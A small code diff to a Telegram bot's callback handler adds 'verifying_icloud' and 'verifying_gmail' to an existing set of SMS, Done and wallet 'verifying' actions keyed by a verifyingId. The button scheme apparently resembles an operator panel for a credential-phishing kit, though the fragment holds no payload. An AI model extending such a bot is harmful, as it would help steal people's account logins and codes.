@@ -149,7 +149,7 @@ bot.on("callback_query", async (query) => {
     }
 
     // ✅ HANDLE VERIFYING BUTTONS (SMS / Done / Wallet)
-    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet") {
+    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
       const verifyingId = email; // email param is actually verifyingId
       console.log(`📲 Verifying choice: ${action} for verifyingId: ${verifyingId}`);
       
